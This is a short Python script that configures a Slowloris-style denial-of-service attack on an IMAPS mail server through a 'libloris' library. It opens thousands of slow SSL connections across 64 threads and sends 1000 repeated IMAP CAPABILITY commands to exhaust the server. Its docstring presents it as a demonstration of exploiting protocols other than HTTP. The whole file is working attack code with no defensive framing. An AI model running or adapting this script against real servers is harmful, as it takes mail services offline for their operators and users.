#! /usr/bin/env python

"""
scriptloris_imaps.py
A quick script to demonstrate the scripting functionality and how
it might be used to exploit protocols other than HTTP, such as IMAPS.
"""

host = 'imaps.example.com'
port = 993

from libloris import *

def main(host, port):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['ssl'] = True

    loris.options['threadlimit'] = 64
    loris.options['connectionlimit'] = 4092
    loris.options['connectionspeed'] = 1

    loris.options['request'] = ''
    for i in range(1000):
        loris.options['request'] += 'a%02i CAPABILITY\n' % (i)

    loris.mainloop()

if __name__ == "__main__":
    main(host, port)